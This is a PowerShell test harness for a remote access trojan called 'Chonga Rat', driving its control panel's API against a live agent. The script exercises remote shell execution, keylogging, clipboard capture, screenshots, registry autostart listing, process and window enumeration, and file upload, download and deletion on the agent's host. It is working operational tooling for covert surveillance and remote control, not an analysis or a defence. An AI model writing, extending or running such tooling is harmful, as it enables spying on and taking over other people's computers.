# Chonga Rat panel verification harness.
#
# Exercises the live stack over the same API the browser uses. Start the panel
# and a built agent first, then:
#
#   powershell -ExecutionPolicy Bypass -File tools/verify.ps1
#
$ErrorActionPreference = "Stop"
$base = "http://127.0.0.1:8787"
$tok = (Invoke-WebRequest "$base/api/config" -UseBasicParsing).Content | ConvertFrom-Json | Select-Object -ExpandProperty token
$H = @{ "X-Panel-Token" = $tok }

function Cmd($name, $arg = @{}, $timeout = 30) {
  $body = @{ cmd = $name; args = $arg; timeout = $timeout } | ConvertTo-Json -Depth 8
  try {
    $r = Invoke-WebRequest "$base/api/cmd" -Headers $H -Method POST -Body $body -ContentType "application/json" -UseBasicParsing -TimeoutSec ($timeout + 5)
    return ($r.Content | ConvertFrom-Json)
  } catch {
    return [pscustomobject]@{ ok = $false; error = $_.Exception.Message }
  }
}
function Show($label, $r) {
  if ($r.ok) { "PASS  $label" } else { "FAIL  $label  -> $($r.error)" }
}

$r = Cmd "ping"; Show "ping" $r
$r = Cmd "sysinfo"; Show "sysinfo" $r
if ($r.ok) { "      host=$($r.data.hostname) cores=$($r.data.cores) ram=$([math]::Round($r.data.ramTotal/1GB,1))GB admin=$($r.data.admin) monitors=$($r.data.monitors)" }

$r = Cmd "drives"; Show "drives" $r
if ($r.ok) { "      " + (($r.data.drives | ForEach-Object { "$($_.path)($($_.type))" }) -join " ") }

$r = Cmd "listdir" @{ path = "C:\" }; Show "listdir C:\" $r
if ($r.ok) { "      $($r.data.entries.Count) entries" }

$r = Cmd "processes"; Show "processes" $r
if ($r.ok) { "      $($r.data.count) processes" }

$r = Cmd "shell" @{ command = "echo chonga-ok"; timeout = 15 }; Show "shell" $r
if ($r.ok) { "      code=$($r.data.code) out=$($r.data.stdout.Trim())" }

$r = Cmd "windows"; Show "windows" $r
if ($r.ok) { "      $($r.data.windows.Count) visible windows" }

$r = Cmd "idle"; Show "idle" $r
if ($r.ok) { "      idle=$($r.data.idle)s" }

$r = Cmd "clipboard_get"; Show "clipboard_get" $r
$old = if ($r.ok) { $r.data.text } else { "" }
$r = Cmd "clipboard_set" @{ text = "chonga-clip-test" }; Show "clipboard_set" $r
$r = Cmd "clipboard_get"; Show "clipboard_get (verify)" $r
if ($r.ok) { "      roundtrip=$($r.data.text -eq 'chonga-clip-test')" }
Cmd "clipboard_set" @{ text = $old } | Out-Null

$r = Cmd "keylog_start"; Show "keylog_start" $r
Start-Sleep -Milliseconds 400
$r = Cmd "keylog_stop"; Show "keylog_stop" $r

$r = Cmd "registry" @{ op = "list"; root = "HKCU"; path = "Software\Microsoft\Windows\CurrentVersion\Run" }; Show "registry list" $r
if ($r.ok) { "      $($r.data.values.Count) values, $($r.data.keys.Count) subkeys" }

$scratch = Join-Path $env:TEMP ("chonga-verify-" + [guid]::NewGuid().ToString("N").Substring(0, 8))
$r = Cmd "mkdir" @{ path = $scratch }; Show "mkdir" $r
$r = Cmd "file_write" @{ path = "$scratch\note.txt"; offset = 0; data = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes("hello from the local panel")); final = $true }; Show "file_write" $r
$r = Cmd "file_read" @{ path = "$scratch\note.txt"; offset = 0; length = 4096 }; Show "file_read" $r
if ($r.ok) { "      text=$([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($r.data.data)))" }
$r = Cmd "rename" @{ path = "$scratch\note.txt"; to = "$scratch\renamed.txt" }; Show "rename" $r

$r = Cmd "screenshot" @{ quality = 60; monitor = 0 } 25; Show "screenshot" $r
if ($r.ok) {
  $bytes = [Convert]::FromBase64String($r.data.jpeg)
  "      $($r.data.width)x$($r.data.height) jpeg=$($bytes.Length) bytes magic=$([BitConverter]::ToString($bytes[0..2]))"
}

$r = Cmd "chat" @{ text = "verification chat" } 20; Show "chat open" $r
Start-Sleep -Milliseconds 600
$r = Cmd "chat_send" @{ text = "message from operator" } 10; Show "chat_send" $r
Start-Sleep -Milliseconds 300
$r = Cmd "chat_close" @{} 10; Show "chat_close" $r
Start-Sleep -Milliseconds 400

$r = Cmd "not_a_real_command"; if (-not $r.ok) { "PASS  unknown command rejected -> $($r.error)" } else { "FAIL  unknown command accepted" }

# upload / download roundtrip
$src = Join-Path $env:TEMP ("chonga-src-" + [guid]::NewGuid().ToString("N").Substring(0, 8) + ".bin")
$rand = New-Object byte[] 700000
(New-Object Random 42).NextBytes($rand)
[IO.File]::WriteAllBytes($src, $rand)
$dest = "$scratch\uploaded.bin"
try {
  $u = Invoke-WebRequest "$base/api/upload?path=$([uri]::EscapeDataString($dest))" -Headers $H -Method POST -InFile $src -ContentType "application/octet-stream" -UseBasicParsing -TimeoutSec 90
  $uj = $u.Content | ConvertFrom-Json
  if ($uj.ok) { "PASS  upload ($($uj.size) bytes)" } else { "FAIL  upload -> $($uj.error)" }
} catch { "FAIL  upload -> $($_.Exception.Message)" }

try {
  $dl = Join-Path $env:TEMP ("chonga-dl-" + [guid]::NewGuid().ToString("N").Substring(0, 8) + ".bin")
  Invoke-WebRequest "$base/api/download?path=$([uri]::EscapeDataString($dest))&token=$tok" -OutFile $dl -UseBasicParsing -TimeoutSec 90
  $h1 = (Get-FileHash $src -Algorithm SHA256).Hash
  $h2 = (Get-FileHash $dl -Algorithm SHA256).Hash
  if ($h1 -eq $h2) { "PASS  download roundtrip (sha256 match)" } else { "FAIL  download hash mismatch" }
  Remove-Item $dl -Force -ErrorAction SilentlyContinue
} catch { "FAIL  download -> $($_.Exception.Message)" }

$r = Cmd "delete" @{ path = "$scratch\renamed.txt" }; Show "delete file" $r
$r = Cmd "delete" @{ path = "$scratch\uploaded.bin" }; Show "delete upload" $r
$r = Cmd "delete" @{ path = $scratch; recursive = $true }; Show "delete dir" $r
Remove-Item $src -Force -ErrorAction SilentlyContinue
